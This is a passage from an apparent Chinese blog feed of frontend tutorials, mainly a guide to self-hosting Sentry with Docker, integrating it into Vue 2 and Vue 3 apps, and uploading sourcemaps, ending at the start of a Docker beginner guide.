class="comment"># 配置项client_max_body_size 10M;</span></span><br><span class="line"></span><br><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">....</span><br><span class="line"><span class="section">location</span> / &#123;</span><br><span class="line">   ...</span><br><span class="line"><span class="attribute">client_max_body_size</span> <span class="number">10M</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><a name="O7WgF"></a></p><h4 id="问题三：本地-dev-环境的触发-bug，在-sentry-上无法展开源码。"><a href="#问题三：本地-dev-环境的触发-bug，在-sentry-上无法展开源码。" class="headerlink" title="问题三：本地 dev 环境的触发 bug，在 sentry 上无法展开源码。"></a>问题三：本地 dev 环境的触发 bug，在 sentry 上无法展开源码。</h4><p>在使用本地 localhost 进行开发时，如果是 dev 环境，触发一个 bug 并上传到 sentry 中，是无法通过 sourceMap 进行源码定位的。因为本地 localhost 在 dev 环境下的生成缓存 bundle 文件和构建完生成的 bundle 文件基本是不一致(如 dev 环境下 webpack 的工作模式是<code>development</code>)，因为文件不一致所以 sourceMap 无法进行错误匹配。</p><p><a name="M3O6a"></a></p><h4 id="问题四：安装-sentry-x2F-cli-过慢？"><a href="#问题四：安装-sentry-x2F-cli-过慢？" class="headerlink" title="问题四：安装 @sentry&#x2F;cli 过慢？"></a>问题四：安装 @sentry&#x2F;cli 过慢？</h4><p>如果 @sentry&#x2F;cli 安装过慢，可以使用淘宝源，具体方法是在项目根目录新建 .npmrc 并增加以下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sentrycli_cdnurl=https://cdn.npm.taobao.org/dist/sentry-cli</span><br></pre></td></tr></table></figure><p><a name="v91la"></a></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><ul><li><a href="https://www.yuque.com/sunyupeng/vscm7w/ke6q5c">https://www.yuque.com/sunyupeng/vscm7w/ke6q5c</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>平台接入sentry自托管项目</title>
      <link href="/2023/06/28/frontend/monitor/ping-tai-jie-ru-sentry-zi-tuo-guan-xiang-mu/"/>
      <url>/2023/06/28/frontend/monitor/ping-tai-jie-ru-sentry-zi-tuo-guan-xiang-mu/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><p><a name="296fdc53"></a></p><h2 id="一、安装-docker"><a href="#一、安装-docker" class="headerlink" title="一、安装 docker"></a>一、安装 docker</h2><p><a name="9c06c99b"></a></p><h3 id="1-Windows-Docker-安装"><a href="#1-Windows-Docker-安装" class="headerlink" title="1.Windows Docker 安装"></a>1.Windows Docker 安装</h3><p><a href="https://www.runoob.com/docker/windows-docker-install.html">https://www.runoob.com/docker/windows-docker-install.html</a><br><a name="afe83730"></a></p><h3 id="2-MacOS-Docker-安装"><a href="#2-MacOS-Docker-安装" class="headerlink" title="2.MacOS Docker 安装"></a>2.MacOS Docker 安装</h3><p><a href="https://www.runoob.com/docker/macos-docker-install.html">https://www.runoob.com/docker/macos-docker-install.html</a></p><ul><li>使用 Homebrew 安装</li><li>手动下载安装</li></ul><p>安装好之后，启动终端，通过命令可以检查安装后的 Docker 版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ docker --version</span><br><span class="line">Docker version 17.09.1-ce, build 19e2cf6</span><br></pre></td></tr></table></figure><p>个人建议 Mac 直接手动下载安装，因为 homebrew 当时安装的时候碰到了一系列问题难以解决</p><p><a name="caae1b73"></a></p><h2 id="二、python3-环境安装"><a href="#二、python3-环境安装" class="headerlink" title="二、python3 环境安装"></a>二、python3 环境安装</h2><p><a name="dec6228f"></a></p><h3 id="1-Window-平台安装-Python"><a href="#1-Window-平台安装-Python" class="headerlink" title="1.Window 平台安装 Python"></a>1.Window 平台安装 Python</h3><p>打开 WEB 浏览器访问 <a href="https://www.python.org/downloads/windows/">https://www.python.org/downloads/windows/</a> ，一般就下载 executable installer，x86 表示是 32 位机子的，x86-64 表示 64 位机子的。<br><a name="50396c72"></a></p><h3 id="2-MAC-平台安装-Python"><a href="#2-MAC-平台安装-Python" class="headerlink" title="2.MAC 平台安装 Python"></a>2.MAC 平台安装 Python</h3><p>MAC 系统都自带有 Python2.7 环境，你可以在链接 <a href="https://www.python.org/downloads/mac-osx/">https://www.python.org/downloads/mac-osx/</a> 上下载最新版安装 Python 3.x。<br />你也可以参考源码安装的方式来安装。</p><p><a name="ba93fb88"></a></p><h2 id="三、sentry-项目代码下载本地执行"><a href="#三、sentry-项目代码下载本地执行" class="headerlink" title="三、sentry 项目代码下载本地执行"></a>三、sentry 项目代码下载本地执行</h2><p>代码下载地址： <a href="https://github.com/getsentry/self-hosted">https://github.com/getsentry/self-hosted</a></p><p>项目代码打开后执行  .&#x2F;install.sh   指令 （时间较久）</p><p>在安装过程中，会提示您是否要创建用户帐户。如果您要求安装不被提示阻止，请运行<code>./install.sh --skip-user-prompt</code>. （第一次执行建议直接执行 .&#x2F;install.sh   指令 创建自己的账户）</p><p>安装成功后 打开 docker 执行 docker compose up -d 指令 （第一次执行时间较久）</p><p>执行成功后 即可访问 <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000/</a></p><p>访问 <a href="http://127.0.0.1:9000/">http://127.0.0.1:9000/</a> 如果出现这样的登录页面，表明 Sentry 部署完成</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953875614-835762d0-e508-463d-968f-b4649a8d9564.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953875614-835762d0-e508-463d-968f-b4649a8d9564.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="decc689c"></a></p><h2 id="四、vue-项目-sentry-端配置"><a href="#四、vue-项目-sentry-端配置" class="headerlink" title="四、vue 项目 sentry 端配置"></a>四、vue 项目 sentry 端配置</h2><p>Sentry 部署完成之后，需要创建一个项目，这个项目就是对应你的 web 项目，我的项目是 vue 写的，对应语言选择 vue 即可，旁边的 team 表示访问权限组<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953946869-fcbc0328-7c74-4830-acea-19f939428116.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953946869-fcbc0328-7c74-4830-acea-19f939428116.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>获取 API Auth Tokens，这个 token 是将来 vue 项目上报程序异常信息到 Sentry 的通信凭证</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953972812-fdcaa307-d450-41be-9c6c-d94f60e7b43a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953972812-fdcaa307-d450-41be-9c6c-d94f60e7b43a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="32072f83"></a></p><h2 id="五、本地项目接入-sentry"><a href="#五、本地项目接入-sentry" class="headerlink" title="五、本地项目接入 sentry"></a>五、本地项目接入 sentry</h2><ul><li><code>@sentry/vue</code> (Sentry’s Vue SDK)</li><li><code>@sentry/tracing</code> (instruments performance data)</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># Using yarn</span><br><span class="line">yarn add @sentry/vue @sentry/tracing</span><br><span class="line"></span><br><span class="line"># Using npm</span><br><span class="line">npm install --save @sentry/vue @sentry/tracing</span><br></pre></td></tr></table></figure><p><a name="Vue2"></a></p><h3 id="Vue2"><a href="#Vue2" class="headerlink" title="Vue2"></a>Vue2</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">import Vue from &quot;vue&quot;;</span><br><span class="line">import Router from &quot;vue-router&quot;;</span><br><span class="line">import * as Sentry from &quot;@sentry/vue&quot;;</span><br><span class="line">import &#123; BrowserTracing &#125; from &quot;@sentry/tracing&quot;;</span><br><span class="line"></span><br><span class="line">Vue.use(Router);</span><br><span class="line"></span><br><span class="line">const router = new Router(&#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Sentry.init(&#123;</span><br><span class="line">  Vue,</span><br><span class="line">  dsn: &quot;https://b1fe70b553f84880bad94839a0acd387@o1280003.ingest.sentry.io/6487277&quot;,</span><br><span class="line">  integrations: [</span><br><span class="line">    new BrowserTracing(&#123;</span><br><span class="line">      routingInstrumentation: Sentry.vueRouterInstrumentation(router),</span><br><span class="line">      tracingOrigins: [&quot;localhost&quot;, &quot;my-site-url.com&quot;, /^\//],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  // Set tracesSampleRate to 1.0 to capture 100%</span><br><span class="line">  // of transactions for performance monitoring.</span><br><span class="line">  // We recommend adjusting this value in production</span><br><span class="line">  tracesSampleRate: 1.0,</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// ...</span><br><span class="line"></span><br><span class="line">new Vue(&#123;</span><br><span class="line">  router,</span><br><span class="line">  render: h =&gt; h(App),</span><br><span class="line">&#125;).$mount(&quot;#app&quot;);</span><br></pre></td></tr></table></figure><p><a name="Vue3"></a></p><h3 id="Vue3"><a href="#Vue3" class="headerlink" title="Vue3"></a>Vue3</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import &#123; createApp &#125; from &quot;vue&quot;;</span><br><span class="line">import &#123; createRouter &#125; from &quot;vue-router&quot;;</span><br><span class="line">import * as Sentry from &quot;@sentry/vue&quot;;</span><br><span class="line">import &#123; BrowserTracing &#125; from &quot;@sentry/tracing&quot;;</span><br><span class="line"></span><br><span class="line">const app = createApp(&#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br><span class="line">const router = createRouter(&#123;</span><br><span class="line">  // ...</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">Sentry.init(&#123;</span><br><span class="line">  app,</span><br><span class="line">  dsn: &quot;https://b1fe70b553f84880bad94839a0acd387@o1280003.ingest.sentry.io/6487277&quot;,</span><br><span class="line">  integrations: [</span><br><span class="line">    new BrowserTracing(&#123;</span><br><span class="line">      routingInstrumentation: Sentry.vueRouterInstrumentation(router),</span><br><span class="line">      tracingOrigins: [&quot;localhost&quot;, &quot;my-site-url.com&quot;, /^\//],</span><br><span class="line">    &#125;),</span><br><span class="line">  ],</span><br><span class="line">  // Set tracesSampleRate to 1.0 to capture 100%</span><br><span class="line">  // of transactions for performance monitoring.</span><br><span class="line">  // We recommend adjusting this value in production</span><br><span class="line">  tracesSampleRate: 1.0,</span><br><span class="line">  logErrors: true</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.use(router);</span><br><span class="line">app.mount(&quot;#app&quot;);</span><br></pre></td></tr></table></figure><p>此时，本地项目执行报错后，sentry 后台即可捕获到错误信息。</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953995787-d8bc55b3-f62a-4d22-b6a1-43c9a346b104.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659953995787-d8bc55b3-f62a-4d22-b6a1-43c9a346b104.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="5f9cbc59"></a></p><h2 id="六、上传-sourceMap"><a href="#六、上传-sourceMap" class="headerlink" title="六、上传 sourceMap"></a>六、上传 sourceMap</h2><p>到目前为止，vue 项目 sentry 配置已经完成，可以收集错误信息了，在 sentry web 端也能看到详细错误信息，但是 vue 项目经过打包之后，代码是经过压缩的，根据错误信息你是无法定位到源代码究竟是哪一行有问题，因此还需要上传 sourcemap 文件，就是将 vue 项目构建之后的源代码上传到 sentry 服务端，所以我们开始进行 sourceMap 上传</p><p><a name="961c56a0"></a></p><h3 id="配置-sentry-x2F-webpack-plugin-插件构建完成自动上传-sourcemap"><a href="#配置-sentry-x2F-webpack-plugin-插件构建完成自动上传-sourcemap" class="headerlink" title="配置@sentry&#x2F;webpack-plugin 插件构建完成自动上传 sourcemap"></a>配置@sentry&#x2F;webpack-plugin 插件构建完成自动上传 sourcemap</h3><p>官方配置了 webpack 插件@sentry&#x2F;webpack-plugin 用来在构建之后自动上传 map 文件</p><p><a name="62414183"></a></p><h5 id="执行步骤"><a href="#执行步骤" class="headerlink" title="执行步骤"></a>执行步骤</h5><ol><li>从您的 [Account] &gt; API keys 创建一个新的身份验证令牌（步骤四已经创建）</li><li>确认您在“Scopes”下选择了 project:write<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954031419-c39c8ca4-7f66-40d9-a378-18700f13d35b.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954031419-c39c8ca4-7f66-40d9-a378-18700f13d35b.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></li></ol><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954040082-28f4b6bf-006d-4c08-bada-83ff28da8a82.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954040082-28f4b6bf-006d-4c08-bada-83ff28da8a82.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><ol start="3"><li>使用 npm 安装 @sentry&#x2F;webpack-plugin</li><li>Using npm:</li></ol><p><code>$ npm install @sentry/webpack-plugin --save-dev</code><br /> b. Using yarn: <br /><code>$ yarn add @sentry/webpack-plugin --dev</code></p><ol start="4"><li>项目下创建 .sentryclirc 文件<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954235826-68a152b9-e94a-49e5-93dd-aaf205764dfa.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954235826-68a152b9-e94a-49e5-93dd-aaf205764dfa.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></li><li>配置.sentryclirc 文件</li><li>更新 vue.config.js 文件配置</li><li>更新 sentry.init() 配置</li></ol><p><a name="f1040079"></a></p><h4 id="配置-sentryclirc-文件"><a href="#配置-sentryclirc-文件" class="headerlink" title="配置.sentryclirc 文件"></a>配置.sentryclirc 文件</h4><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954250222-98067c79-07ed-4cbd-8c49-28b309511b07.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954250222-98067c79-07ed-4cbd-8c49-28b309511b07.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>含义解释：</p><ul><li>url：上传的服务器根目录，我这边目前本地搭建，指向本地，等安慕希这边运维搭建好服务之后，即指向搭建好的服务器上。</li><li>org：这个可不是瞎写的，还记得注册的时候填的组织吗？不记得？没关系，看下图：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954264879-d3133951-4c27-4bac-808e-c98ac72c6d7f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954264879-d3133951-4c27-4bac-808e-c98ac72c6d7f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></li><li>project: 看上图，就是你的项目名字。</li><li>token: 这个需要生成， 点击下图右上角的 Creat New Token：<br /><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954285928-9ab2d3c7-9469-4ebb-86aa-0ada7ffc979f.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954285928-9ab2d3c7-9469-4ebb-86aa-0ada7ffc979f.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></li></ul><p><a name="5ed85804"></a></p><h4 id="更新-vue-config-js-配置"><a href="#更新-vue-config-js-配置" class="headerlink" title="更新 vue.config.js 配置"></a>更新 vue.config.js 配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">const SentryCliPlugin = require(&quot;@sentry/webpack-plugin&quot;);</span><br><span class="line"></span><br><span class="line"> plugins: [</span><br><span class="line">    new SentryCliPlugin(&#123;</span><br><span class="line">    authToken: process.env.token,</span><br><span class="line">      org: process.env.org,</span><br><span class="line">      project: process.env.project,</span><br><span class="line">      include: &#x27;./dist&#x27;, // 作用的文件夹</span><br><span class="line">      release: &#x27;sentry0.0.2&#x27;, // 一致的版本号</span><br><span class="line">      configFile: &#x27;.sentryclirc&#x27;,</span><br><span class="line">      ignoreFile: &#x27;.sentrycliignore&#x27;,</span><br><span class="line">      ignore: [&#x27;node_modules&#x27;, &#x27;vue.config.js&#x27;],</span><br><span class="line">      urlPrefix: &#x27;~/static/js&#x27;</span><br><span class="line">    &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><a name="acb04427"></a></p><h4 id="更新-sentry-init-配置"><a href="#更新-sentry-init-配置" class="headerlink" title="更新 sentry.init() 配置"></a>更新 sentry.init() 配置</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Sentry.init(&#123;</span><br><span class="line">  Vue,</span><br><span class="line">  dsn: &#x27;http://90f19653173948f2b03b5b9fb5751cfa@127.0.0.1:9000/2&#x27;,</span><br><span class="line">  release: &#x27;sentry0.0.2&#x27;,   //  更新此处，要保持跟vue.config.js中的release版本号一致</span><br><span class="line">  integrations: [</span><br><span class="line">    new BrowserTracing(&#123;</span><br><span class="line">      routingInstrumentation: Sentry.vueRouterInstrumentation(router),</span><br><span class="line">      tracingOrigins: [&#x27;localhost&#x27;, &#x27;my-site-url.com&#x27;, /^\//]</span><br><span class="line">    &#125;)</span><br><span class="line">  ],</span><br><span class="line">  // Set tracesSampleRate to 1.0 to capture 100%</span><br><span class="line">  // of transactions for performance monitoring.</span><br><span class="line">  // We recommend adjusting this value in production</span><br><span class="line">  tracesSampleRate: 1.0,</span><br><span class="line">  logErrors: true</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p><a name="54c0d7aa"></a></p><h2 id="七、定位源代码"><a href="#七、定位源代码" class="headerlink" title="七、定位源代码"></a>七、定位源代码</h2><p><a name="793d0ab0"></a></p><h3 id="1-查看发布的版本-从对应版本进入项目"><a href="#1-查看发布的版本-从对应版本进入项目" class="headerlink" title="1.查看发布的版本,从对应版本进入项目"></a>1.查看发布的版本,从对应版本进入项目</h3><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954301486-5fc27989-05b3-4ba6-b539-308171485a45.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954301486-5fc27989-05b3-4ba6-b539-308171485a45.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="9cd52ed2"></a></p><h3 id="2-查看错误日志"><a href="#2-查看错误日志" class="headerlink" title="2.查看错误日志"></a>2.查看错误日志</h3><p>随便找一个错误日志<br />没有错误,可以在构建前手动创建一个错误看看效果</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954311670-5bc7c92f-36df-43c7-b65c-2aa47380840c.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954311670-5bc7c92f-36df-43c7-b65c-2aa47380840c.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="880cd20a"></a></p><h3 id="3-切换配置-查看源码信息"><a href="#3-切换配置-查看源码信息" class="headerlink" title="3.切换配置,查看源码信息"></a>3.切换配置,查看源码信息</h3><p>上传<code>sourceMap</code>前只有 <code>Full</code>和<code>Raw</code>两个选项,而且错误日志不是很明确,不能定位到发生错误的地方<br /><code>sourceMap</code>上传并生效后,如图可以切换<code>Original</code>等选项,切换后可以看到报错的代码内容</p><p><img src="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954321763-b6d6dd9e-2ea3-4f39-bd9e-c23387468f3a.png" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2022/png/25400311/1659954321763-b6d6dd9e-2ea3-4f39-bd9e-c23387468f3a.png" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="Tips"></a></p><h3 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h3><p>在上传<code>sourceMap</code>的时候会遇到几个坑</p><ol><li>安装插件前要先配置<code>.sentryclirc</code>文件,只有插件是无法上传到指定项目的</li><li><code>token</code>为<code>API</code>令牌,需要自己创建,不是错以为是设置中的安全令牌或者其他<code>key</code></li><li>插件方法<code>SentryWebpackPlugin</code>中要设置<code>release</code>参数指定版本,同时<code>Sentry.init</code>方法中也要<code>release</code>参数指定版本,两个版本号需要保持一致,<code>sourceMap</code>才会生效</li><li>即便上传了<code>sourceMap</code>和保持<code>release</code>版本号一致,还需要一个文件路径的配置,方便<code>sourceMap</code>定位到要访问的文件,需要指定<code>urlPrefix</code>参数<ol><li><code>urlPrefix</code>不设置的话,默认为<code>~/</code>,<code>~</code>代表网站的协议和域名</li><li><code>map</code>文件一般被<code>webpack</code>打包在根目录&#x2F;static&#x2F;js&#x2F;的文件夹下,如访问<code>https://dsx2016.com</code>,那么 map 文件就是<code>https://dsx2016.com/static/js/xxx.map</code>,所以要指定<code>urlPrefix为&quot;~/static/js&quot;</code></li><li>如果经过<code>nginx</code>等代理导致目录更深一级等,就加入到对应的前缀即可,如果<code>nginx</code>代理网站为<code>https://dsx2016.com/home</code>,那么 map 文件就是<code>https://dsx2016.com/home/static/js/xxx.map</code>,所以要指定<code>urlPrefix为&quot;~/home/static/js&quot;</code>,具体的目录看具体的场景,直接看打包好部署的<code>map</code>在哪个文件即可</li></ol></li></ol><p><a href="https://ask.dcloud.net.cn/question/139768">uniapp 小程序接入 sentry</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
          <category> 监控 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端 </tag>
            
            <tag> 监控 </tag>
            
            <tag> sentry </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>docker入门一文就够了</title>
      <link href="/2023/06/28/frontend/monitor/docker-ru-men-yi-wen-jiu-gou-liao/"/>
      <url>/2023/06/28/frontend/monitor/docker-ru-men-yi-wen-jiu-gou-liao/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer" /><blockquote><p>个人学习 docker 整理的一些资料和 demo，后续会根据新用到的功能不定期更新，有问题欢迎留言</p></blockquote><p><a name="YSAfK"></a></p><h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>docker 这个东西是什么就不介绍了，百度&#x2F;google 有很多，写这篇文章的初衷是记录一下自己在学习过程中的坑，避免后续可能会用到的情况下忘掉，其次给团队小伙伴入坑避避雷</p><p><a name="ITujW"></a></p><h1 id="docker-安装"><a href="#docker-安装" class="headerlink" title="docker 安装"></a>docker 安装</h1><p>强调一下学一个东西，一定要先进官网，一般比较优秀的项目文档都写得很不错的，比如<a href="https://docs.docker.com/">docker 官网</a><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611820093046-4aa3b4bd-28d9-4583-87da-f3043684b590.png#height=747&id=JKzut&originHeight=747&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88361&status=done&style=none&title=&width=1175" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611820093046-4aa3b4bd-28d9-4583-87da-f3043684b590.png#height=747&id=JKzut&originHeight=747&originWidth=1175&originalType=binary&ratio=1&rotation=0&showTitle=false&size=88361&status=done&style=none&title=&width=1175" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />首先还是要安装一下 docker，点击<code>download and install</code><br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611820203756-00dd13dd-b1d9-48b7-9534-638c72b8e90c.png#height=527&id=NhF3D&originHeight=527&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122387&status=done&style=none&title=&width=1283" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611820203756-00dd13dd-b1d9-48b7-9534-638c72b8e90c.png#height=527&id=NhF3D&originHeight=527&originWidth=1283&originalType=binary&ratio=1&rotation=0&showTitle=false&size=122387&status=done&style=none&title=&width=1283" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"><br />安装完成后，打开终端工具，显示下图即安装成功<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611821090462-3860a71e-1d79-477f-b2ab-11951dc1a113.png#height=82&id=F3ANb&originHeight=82&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24155&status=done&style=none&title=&width=576" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611821090462-3860a71e-1d79-477f-b2ab-11951dc1a113.png#height=82&id=F3ANb&originHeight=82&originWidth=576&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24155&status=done&style=none&title=&width=576" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p><a name="2JgW9"></a></p><h1 id="启动第一个容器"><a href="#启动第一个容器" class="headerlink" title="启动第一个容器"></a>启动第一个容器</h1><p>还记得刚才下载的<a href="https://docs.docker.com/docker-for-mac/install/">docker desktop</a>么，除了提供 docker 环境外，本身也提供一个对新手非常友好的图形化界面，打开 docker desktop（默认会安装到“应用程序“），配置之类的可以暂时忽略，点击”dashboard”<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823573615-ca092c27-b987-45c4-a892-f217c17f149e.png#height=354&id=DzUcj&originHeight=354&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162909&status=done&style=none&title=&width=692" class="lazyload placeholder" data-srcset="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823573615-ca092c27-b987-45c4-a892-f217c17f149e.png#height=354&id=DzUcj&originHeight=354&originWidth=692&originalType=binary&ratio=1&rotation=0&showTitle=false&size=162909&status=done&style=none&title=&width=692" srcset="https://maiwoqiche-1251117131.cos.ap-shanghai.myqcloud.com/internationalStation/loading.gif" alt="image.png"></p><p>会弹出一个图形化界面，此时默认在 containers 一栏，当前是没有任何容器的状态，可以看到中间有一段命令，复制执行一下<br /><img src="https://cdn.nlark.com/yuque/0/2021/png/268444/1611823727345-1ed652b8-9643-46a5-a02b-ac70e301aa95.png#height=1440&id=rmeNO&originHeight=1440&originWidth=2500&originalType=binary&ratio=1&rotation=0&showTitle=false&size=207491&status=done&style=none&title=&width=2500" class="lazyload placeholder" 